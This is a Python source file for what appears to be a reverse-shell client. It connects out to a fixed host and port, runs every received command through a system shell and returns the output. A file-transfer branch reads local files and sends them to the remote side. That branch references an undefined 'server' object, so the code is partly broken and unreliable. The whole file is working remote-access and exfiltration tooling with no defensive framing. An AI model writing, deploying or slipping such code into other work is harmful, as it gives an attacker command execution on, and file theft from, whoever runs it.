import os
import socket
import subprocess, time


# Create a socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '192.168.0.5'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))


# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == "ft":
                def send_file(file):
                    print(file)
                    name = file.split("/")[-1]
                    with open(file, "r") as f:
                        file = f.read()
                        buffer = str(len(file))
                        server.send("#{0}#{1}".format(buffer, name).encode("utf-8"))
                        time.sleep(0.1)
                        server.send(file.encode("utf-8"))
                while True:
                    file_name = server.recv(1024).decode("utf-8")
                    if file_name.split("#", 1)[0] == "(FT)":
                        file_name = file_name.split("#", 1)[1]
                        send_file(file_name)
                    break
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
    s.close()


def main():
    socket_create()
    socket_connect()
    receive_commands()


main()
